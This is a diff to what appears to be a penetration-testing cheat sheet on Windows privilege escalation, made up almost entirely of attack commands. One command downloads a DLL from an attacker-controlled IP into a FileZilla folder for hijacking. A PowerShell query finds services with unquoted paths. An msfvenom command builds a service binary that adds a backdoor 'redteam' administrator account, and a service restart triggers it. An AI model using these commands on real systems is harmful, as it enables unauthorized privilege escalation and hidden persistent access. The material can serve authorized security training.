@@ -1169,4 +1169,21 @@ iwr -uri http://192.168.48.3/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FT
 wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
 ~~~
 
+~~~ powershell
+Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode
+~~~
+
+#### Create exe-service
+~~~ bash
+msfvenom -p windows/x64/exec CMD="net user redteam password123! /add && net localgroup Administrators redteam /add" -f exe-service -o Abyss.exe
+~~~
+
+
+#### Restart service
+
+~~~ powershell
+Restart-Service AbyssWebServer
+~~~
+
+
 
